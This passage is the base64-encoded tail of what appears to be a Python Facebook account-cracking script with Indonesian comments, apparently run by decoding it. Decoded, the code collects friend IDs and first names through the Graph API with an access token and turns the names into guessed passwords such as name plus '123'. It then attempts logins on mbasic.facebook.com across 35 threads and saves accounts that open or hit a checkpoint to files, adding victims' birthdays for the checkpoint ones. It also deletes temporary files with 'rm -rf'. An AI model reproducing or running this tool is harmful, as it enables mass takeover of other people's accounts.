LmNvbS8lcy8/YWNjZXNzX3Rva2VuPSVzIiUoaWR0OCx0b2tlbikpLmpzb24oKVsiZmlyc3RfbmFtZSJdCiAgICAgICAgc2Q4ID0gKG5tYTgrIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIGRtOCA9IG9wZW4oc2Q4LCJyIikucmVhZCgpCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOgogICAgICAgIGRtOCA9ICdcbicKICAgICAgICBzZDggPSAnbm9uZScKICAgIHRyeToKICAgICAgICBubWE5ID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy8/YWNjZXNzX3Rva2VuPSVzIiUoaWR0OSx0b2tlbikpLmpzb24oKVsiZmlyc3RfbmFtZSJdCiAgICAgICAgc2Q5ID0gKG5tYTkrIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIGRtOSA9IG9wZW4oc2Q5LCJyIikucmVhZCgpCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOgogICAgICAgIGRtOSA9ICdcbicKICAgICAgICBzZDkgPSAnbm9uZScKICAgIHRyeToKICAgICAgICBubWEwID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcy8/YWNjZXNzX3Rva2VuPSVzIiUoaWR0MCx0b2tlbikpLmpzb24oKVsiZmlyc3RfbmFtZSJdCiAgICAgICAgc2QwID0gKG5tYTArIi5qc29uIikucmVwbGFjZSgiICIsIl8iKQogICAgICAgIGRtMCA9IG9wZW4oc2QwLCJyIikucmVhZCgpCiAgICBleGNlcHQgKEtleUVycm9yLElPRXJyb3IpOgogICAgICAgIGRtMCA9ICdcbicKICAgICAgICBzZDAgPSAnbm9uZScKICAgIG9uZiA9IChuZisiLmpzb24iKS5yZXBsYWNlKCIgIiwiXyIpCiAgICBvZmYgPSBvcGVuKG9uZiwidyIpCiAgICBvZmYud3JpdGUoZG0xK2RtMitkbTMrZG00K2RtNStkbTYrZG03K2RtOCtkbTkrZG0wKQogICAgb2ZmLmNsb3NlKCkKICAgIG9zLnN5c3RlbSgncm0gLXJmICVzJyUoc2QxKSkKICAgIG9zLnN5c3RlbSgncm0gLXJmICVzJyUoc2QyKSkKICAgIG9zLnN5c3RlbSgncm0gLXJmICVzJyUoc2QzKSkKICAgIG9zLnN5c3RlbSgncm0gLXJmICVzJyUoc2Q0KSkKICAgIG9zLnN5c3RlbSgncm0gLXJmICVzJyUoc2Q1KSkKICAgIG9zLnN5c3RlbSgncm0gLXJmICVzJyUoc2Q2KSkKICAgIG9zLnN5c3RlbSgncm0gLXJmICVzJyUoc2Q3KSkKICAgIG9zLnN5c3RlbSgncm0gLXJmICVzJyUoc2Q4KSkKICAgIG9zLnN5c3RlbSgncm0gLXJmICVzJyUoc2Q5KSkKICAgIG9zLnN5c3RlbSgncm0gLXJmICVzJyUoc2QwKSkKICAgIHJldHVybiBjcmFjayhvbmYpCgojIFBhc3N3b3JkcwpkZWYgZGFwdW50YWdhbnRlbmcodGV4dCk6CiAgICByZXN1bHRzPVtdCiAgICBmb3IgaSBpbiB0ZXh0LnNwbGl0KCIgIik6CiAgICAgICAgaT1pLmxvd2VyKCkKICAgICAgICBpZiBsZW4oaSk9PTEgb3IgbGVuKGkpPT0yIG9yIGxlbihpKT09MyBvciBsZW4oaSk9PTQgb3IgbGVuKGkpPT01OgogICAgICAgICAgICByZXN1bHRzLmFwcGVuZChpKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJlc3VsdHMuYXBwZW5kKGkrIjEyMyIpCiAgICAgICAgICAgIHJlc3VsdHMuYXBwZW5kKGkrIjEyMzQ1IikKICAgICAgICAgICAgI3Jlc3VsdHMuYXBwZW5kKCI3ODY3ODYiKQogICAgICAgICAgICAjcmVzdWx0cy5hcHBlbmQoIjEwMjAzMCIpCiAgICAgICAgICAgICNyZXN1bHRzLmFwcGVuZCgiMjAzMDQwIikKICAgIHJldHVybiByZXN1bHRzCgojIExvZ2dlciBVdGFtYSAoUGVyY29iYWFuIExvZ2luIFNldGlhcCBJRCArIFBhc3N3b3JkKQpkZWYgbG9nZ2VyKGVtLHBhcyxob3N0cyk6CiAgICB1YSA9ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL2l0X0lEO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XSIKICAgIHIgPSByZXF1ZXN0cy5TZXNzaW9uKCkKICAgIHIuaGVhZGVycy51cGRhdGUoeyJIb3N0IjoibWJhc2ljLmZhY2Vib29rLmNvbSIsImNhY2hlLWNvbnRyb2wiOiJtYXgtYWdlPTAiLCJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjoiMSIsInVzZXItYWdlbnQiOnVhLCJhY2NlcHQiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44IiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43In0pCiAgICBwID0gci5nZXQoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS8iKQogICAgYiA9IGJzNC5CZWF1dGlmdWxTb3VwKHAudGV4dCwiaHRtbC5wYXJzZXIiKQogICAgbWV0YT0iIi5qb2luKGJzNC5yZS5maW5kYWxsKCdkdHNnIjpceyJ0b2tlbiI6IiguKj8pIicscC50ZXh0KSkKICAgIGRhdGE9e30KICAgIGZvciBpIGluIGIoImlucHV0Iik6CiAgICAgICAgaWYgaS5nZXQoInZhbHVlIikgaXMgTm9uZToKICAgICAgICAgICAgaWYgaS5nZXQoIm5hbWUiKT09ImVtYWlsIjoKICAgICAgICAgICAgICAgIGRhdGEudXBkYXRlKHsiZW1haWwiOmVtfSkKICAgICAgICAgICAgZWxpZiBpLmdldCgibmFtZSIpPT0icGFzcyI6CiAgICAgICAgICAgICAgICBkYXRhLnVwZGF0ZSh7InBhc3MiOnBhc30pCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKToiIn0pCiAgICAgICAgZWxzZToKICAgICAgICAgICAgZGF0YS51cGRhdGUoe2kuZ2V0KCJuYW1lIik6aS5nZXQoInZhbHVlIil9KQogICAgZGF0YS51cGRhdGUoCiAgICAgICAgeyJmYl9kdHNnIjptZXRhLCJtX3Nlc3MiOiIiLCJfX3VzZXIiOiIwIiwKICAgICAgICAiX19yZXEiOiJkIiwiX19jc3IiOiIiLCJfX2EiOiIiLCJfX2R5biI6IiIsImVuY3Bhc3MiOiIiCiAgICAgICAgfQogICAgKQogICAgci5oZWFkZXJzLnVwZGF0ZSh7InJlZmVyZXIiOiJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vbG9naW4vP25leHQmcmVmPWRibCZmbCZyZWZpZD04In0pCiAgICBwbyA9IHIucG9zdCgiaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9sb2dpbi9hc3luYy8/cmVmc3JjPWh0dHBzJTNBJTJGJTJGbS5mYWNlYm9vay5jb20lMkZsb2dpbiUyRiUzRnJlZiUzRGRibCZsd3Y9MTAwIixkYXRhPWRhdGEpLnRleHQKICAgIGlmICJjX3VzZXIiIGluIGxpc3Qoci5jb29raWVzLmdldF9kaWN0KCkua2V5cygpKToKICAgICAgICByZXR1cm4geyJzdGF0dXMiOiJzdWNjZXNzIiwiZW1haWwiOmVtLCJwYXNzIjpwYXMsImNvb2tpZXMiOnIuY29va2llcy5nZXRfZGljdCgpfQogICAgZWxpZiAiY2hlY2twb2ludCIgaW4gbGlzdChyLmNvb2tpZXMuZ2V0X2RpY3QoKS5rZXlzKCkpOgogICAgICAgIHJldHVybiB7InN0YXR1cyI6ImNwIiwiZW1haWwiOmVtLCJwYXNzIjpwYXMsImNvb2tpZXMiOnIuY29va2llcy5nZXRfZGljdCgpfQogICAgZWxzZTpyZXR1cm4geyJzdGF0dXMiOiJlcnJvciIsImVtYWlsIjplbSwicGFzcyI6cGFzfQoKIyBQcm9zZXMgQ3JhY2sgKFNlbGVrc2kgTG9naW4pCmNsYXNzIGNyYWNrOgogICAgIyBQZW1pc2FoYW4gSUQgJiBQYXNzd29yZAogICAgZGVmIF9faW5pdF9fKHNlbGYsZmlsZXMpOgogICAgICAgIHNlbGYuYWRhID0gW10KICAgICAgICBzZWxmLmNwID0gW10KICAgICAgICBzZWxmLmtvID0gMAogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmFwaz1maWxlcwogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmZzPW9wZW4oc2VsZi5hcGspLnJlYWQoKS5zcGxpdGxpbmVzKCkKICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJFcnJvciA6ICVzIiUoZSkpCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICBzZWxmLmZsPVtdCiAgICAgICAgICAgICAgICBmb3IgaSBpbiBzZWxmLmZzOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5mbC5hcHBlbmQoeyJpZCI6aS5zcGxpdCgi4oCiIilbMF0sInB3IjpkYXB1bnRhZ2FudGVuZyhpLnNwbGl0KCLigKIiKVsxXSl9KQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpjb250aW51ZQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwcmludCgiRXJyb3IgOiAlcyIlKGUpKQogICAgICAgICAgICBwcmludCgnXG5DcmFjayBTdGFydHMuLi4nKQogICAgICAgICAgICBwcmludCgnQWNjb3VudCBbT0tdIFNhdmVkIFRvIE9LLyVzLnR4dCclKHRhbmdnYWwpKQogICAgICAgICAgICBwcmludCgnQWNjb3VudCBbQ1BdIFNhdmVkIFRvIENQLyVzLnR4dFxuJyUodGFuZ2dhbCkpCiAgICAgICAgICAgIFRocmVhZFBvb2woMzUpLm1hcChzZWxmLm11bGFpLHNlbGYuZmwpCiAgICAgICAgICAgIG9zLnJlbW92ZShzZWxmLmFwaykKICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgICAgIGJyZWFrCiAgICAjIFNlbGVrdG9yIExvZ2luCiAgICBkZWYgbXVsYWkoc2VsZixmbCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBmb3IgaSBpbiBmbC5nZXQoInB3Iik6CiAgICAgICAgICAgICAgICBsb2cgPSBsb2dnZXIoZmwuZ2V0KCJpZCIpLAogICAgICAgICAgICAgICAgICAgIGksImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIpCiAgICAgICAgICAgICAgICBpZiBsb2cuZ2V0KCJzdGF0dXMiKT09ImNwIjoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGtlID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8iICsgZmwuZ2V0KCJpZCIpICsgIj9hY2Nlc3NfdG9rZW49IiArIG9wZW4oInRva2VuLnR4dCIsInIiKS5yZWFkKCkpCiAgICAgICAgICAgICAgICAgICAgICAgIHR0ID0ganNvbi5sb2FkcyhrZS50ZXh0KQogICAgICAgICAgICAgICAgICAgICAgICB0dGwgPSB0dFsiYmlydGhkYXkiXQogICAgICAgICAgICAgICAgICAgICAgICBtLGQseSA9IHR0bC5zcGxpdCgiLyIpCiAgICAgICAgICAgICAgICAgICAgICAgIG0gPSBidWxhbl90dGxbbV0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIlxyXHgxYlswOzk3bVtDUF0gJXMg4oCiICVzIOKAoiAlcyAlcyAlcyAgIFx4MWJbMDs5N20iJShmbC5nZXQoImlkIiksaSxkLG0seSkpCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuY3AuYXBwZW5kKCIlc+KAoiVz4oCiJXMlcyVzIiUoZmwuZ2V0KCJpZCIpLGksZCxtLHkpKQogICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCJDUC8lcy50eHQiJSh0YW5nZ2FsKSwiYSsiKS53cml0ZSgiJXPigKIlc+KAoiVzJXMlc1xuIiUoZmwuZ2V0KCJpZCIpLGksZCxtLHkpKQogICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIGV4Y2VwdChLZXlFcnJvciwgSU9FcnJvcik6CiAgICAgICAgICAgICAgICAgICAgICAgIG0gPSAiICIKICAgICAgICAgICAgICAgICAgICAgICAgZCA9ICIgIgogICAgICAgICAgICAgICAgICAgICAgICB5ID0gIiAiCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OnBhc3MKICAgICAgICAgICAgICAgICAgICBwcmludCgiXHJceDFiWzA7OTdtW0NQXSAlcyDigKIgJXMgICAgICAgICAgICAgICBceDFiWzA7OTdtIiUoZmwuZ2V0KCJpZCIpLGkpKQogICAgICAgICAgICAgICAgICAgIHNlbGYuY3AuYXBwZW5kKCIlc+KAoiVzIiUoZmwuZ2V0KCJpZCIpLGkpKQogICAgICAgICAgICAgICAgICAgIG9wZW4oIkNQLyVzLnR4dCIlKHRhbmdnYWwpLCJhKyIpLndyaXRlKCIlc+KAoiVzXG4iJShmbC5nZXQoImlkIiksaSkpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGVsaWYgbG9nLmdldCgic3RhdHVzIik9PSJzdWNjZXNzIjoKICAgICAgICAgICAgICAgICAgICBwcmludCgiXHJceDFiWzA7OTJtW09LXSAlcyDigKIgJXMgICAgICAgICAgICAgICBceDFiWzA7OTdtIiUoZmwuZ2V0KCJpZCIpLGkpKQogICAgICAgICAgICAgICAgICAgIHNlbGYuYWRhLmFwcGVuZCgiJXPigKIlcyIlKGZsLmdldCgiaWQiKSxpKSkKICAgICAgICAgICAgICAgICAgICBvcGVuKCJPSy8lcy50eHQiJSh0YW5nZ2FsKSwiYSsiKS53cml0ZSgiJXPigKIlc1xuIiUoZmwuZ2V0KCJpZCIpLGkpKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbHNlOmNvbnRpbnVlCiAgICAgICAgICAgIHNlbGYua28rPTEKICAgICAgICAgICAgcHJpbnQoIlxyW0NyYWNrXVslcy8lc11bT0s6JXNdW0NQOiVzXSIlKHNlbGYua28sbGVuKHNlbGYuZmwpLGxlbihzZWxmLmFkYSksbGVuKHNlbGYuY3ApKSwgZW5kPScgJyk7c3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBzZWxmLm11bGFpKGZsKQoKIyBQZW5naGl0dW5nYW4gSGFzaWwKZGVmIHJlc3VsdHMoRGFwdW50YSxLcmFoa3JhaCk6CiAgICAgICAgaWYgbGVuKERhcHVudGEpICE9MDoKICAgICAgICAgICAgICAgIHByaW50KCgiW09LXSA6ICIrc3RyKGxlbihEYXB1bnRhKSkpKQogICAgICAgIGlmIGxlbihLcmFoa3JhaCkgIT0wOgogICAgICAgICAgICAgICAgcHJpbnQoKCJbQ1BdIDogIitzdHIobGVuKEtyYWhrcmFoKSkpKQogICAgICAgIGlmIGxlbihEYXB1bnRhKSA9PTAgYW5kIGxlbihLcmFoa3JhaCkgPT0wOgogICAgICAgICAgICAgICAgcHJpbnQoIlxuIikKICAgICAgICAgICAgICAgIHByaW50KCdUaWRhayBBZGEgSGFzaWwnKQoKIyBUcmlnZ2VyIFV0YW1hCmlmIF9fbmFtZV9fPT0iX19tYWluX18iOgoJcHVibGlrKCkK"))
